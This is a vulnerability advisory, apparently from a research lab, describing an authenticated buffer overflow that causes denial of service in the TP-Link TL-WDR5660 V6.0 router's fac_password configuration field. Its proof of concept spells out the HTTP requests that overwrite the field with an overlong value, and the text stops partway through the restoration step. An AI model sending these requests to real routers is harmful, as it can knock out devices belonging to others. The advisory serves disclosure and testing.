## Title: Authenticated Buffer Overflow in TP-Link TL-WDR5660 V6.0 uhttpd.webPwd.fac_password

**BUG_Author:** PRISMI Lab

**Affected Version:** TP-Link TL-WDR5660 V6.0, firmware release `20220114_3.0.0`

**Vendor:** [TP-Link](https://www.tp-link.com.cn/)

**Software:** TP-Link TL-WDR5660 V6.0 router firmware, web management configuration service

**Discovery Date:** 2026-07-06

**Vulnerability Files:**

- Web management backend endpoint: `POST /stok=<session>/ds`
- Configuration object: `uhttpd.webPwd`
- Affected parameter: `fac_password`

The supplied material identifies the endpoint and configuration field, but does not identify the firmware executable path or source file implementing the handler.

## Description:

1. **Insufficient Length Validation in the Password Configuration Handler:**
   - a post-authentication buffer overflow when the web management backend processes an excessively long `uhttpd.webPwd.fac_password` value.
   - An attacker with a valid administrator management session can reach the handler through the `/stok=<session>/ds` configuration interface using `method = set`.

2. **Reported Security Impact:**
   - The malformed input causes management-service failure or device instability, resulting in denial of service.
   - The issue persists after a reboot. 

## Proof of Concept:

The following HTTP requests document the existing reproduction procedure. Replace `192.168.1.1` with the test router address and `<session>` with a valid administrator `stok` token. Replace `<body-byte-length>` in each POST request with the UTF-8 byte length of its body.

1. **Establish an Administrator Session:**

   Log in to the web management interface with a valid administrator password. Obtain the `stok` token from an authenticated management request.

2. **Read the Original Password Configuration:**

   ```http
   POST /stok=<session>/ds HTTP/1.1
   Host: 192.168.1.1
   Content-Length: <body-byte-length>
   Content-Type: application/json; charset=UTF-8
   X-Requested-With: XMLHttpRequest
   Referer: http://192.168.1.1/stok=<session>/pc/SysChangeLgPwd.htm

   {"method":"get","uhttpd":{"name":["webPwd"]}}
   ```

   Record the returned `uhttpd.webPwd.password` and `uhttpd.webPwd.fac_password` values for comparison and restoration. In the request below, replace `<original-password-store>` with the exact stored `password` value, preserving valid JSON escaping.

3. **Submit the Boundary Test Input:**

   ```http
   POST /stok=<session>/ds HTTP/1.1
   Host: 192.168.1.1
   Content-Length: <body-byte-length>
   Content-Type: application/json; charset=UTF-8
   X-Requested-With: XMLHttpRequest
   Referer: http://192.168.1.1/stok=<session>/pc/SysChangeLgPwd.htm

   {"method":"set","uhttpd":{"webPwd":{"password":"<original-password-store>","fac_password":"BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB"}}}
   ```

   The `fac_password` value above contains exactly 36 ASCII `B` characters. The supplied test sequence also uses 35, 40, and 64 characters. Start each comparison from a known baseline and stop if the device becomes unresponsive.

4. **Verify the Service State:**

   Repeat the read request from step 2, check whether the management interface still responds, and attempt a fresh login using the original administrator password. The supplied material also queries runtime information with this JSON body at the same endpoint:

   ```json
   {"method":"get","system":{"name":["runtime"]}}
   ```

   Record the configuration response, subsequent availability, and login results separately. An accepted write or a login failure alone does not establish memory corruption. A crash trace, memory diagnostic, or matching binary analysis is needed to substantiate the overflow mechanism.

5. **Reported Result and Restoration:**

   Writing an excessively large value for `fac_password` resulted in a denial-of-service condition and system instability. 

   If management access remains available, restore both original `webPwd` values using the same `method = set` operation and verify normal ac